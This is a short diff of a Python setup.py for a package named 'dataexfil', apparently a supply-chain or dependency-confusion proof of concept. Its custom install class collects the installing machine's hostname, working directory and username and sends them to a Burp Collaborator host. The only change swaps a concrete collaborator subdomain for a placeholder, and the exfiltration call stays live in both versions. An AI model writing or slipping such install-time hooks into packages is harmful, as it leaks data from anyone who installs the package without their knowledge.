@@ -12,7 +12,7 @@ class CustomInstall(install):
         cwd = os.getcwd()
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
-        requests.get("https://8z8u9afp3jwwerbub7fzmgdgq7wyvmk.burpcollaborator.net",params = ploads)
+        requests.get("https://yourburpcolloboratorid.burpcollaborator.net",params = ploads)
 
 
 setup(name='dataexfil',
